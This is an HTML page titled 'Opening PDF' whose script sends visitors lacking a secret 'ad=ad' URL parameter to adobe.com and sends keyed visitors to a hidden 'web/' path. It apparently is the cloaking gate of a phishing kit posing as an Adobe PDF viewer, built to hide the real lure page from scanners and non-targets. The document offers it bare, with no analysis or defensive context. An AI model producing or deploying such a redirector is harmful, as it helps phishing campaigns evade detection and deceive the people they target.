<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Opening PDF</title>
    <script>
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const key = urlParams.get('ad');
            
            if (key !== 'ad') {
                window.location.replace('https://www.adobe.com');
                window.location.href = 'https://www.adobe.com';
                document.location = 'https://www.adobe.com';
            } else {
                window.location.replace('web/?ad=ad');
                window.location.href = 'web/?ad=ad';
                document.location = 'web/?ad=ad';
            }
        })();
    </script>
    <meta http-equiv="refresh" content="0;url=https://www.adobe.com">
</head>
<body>
</body>
</html>
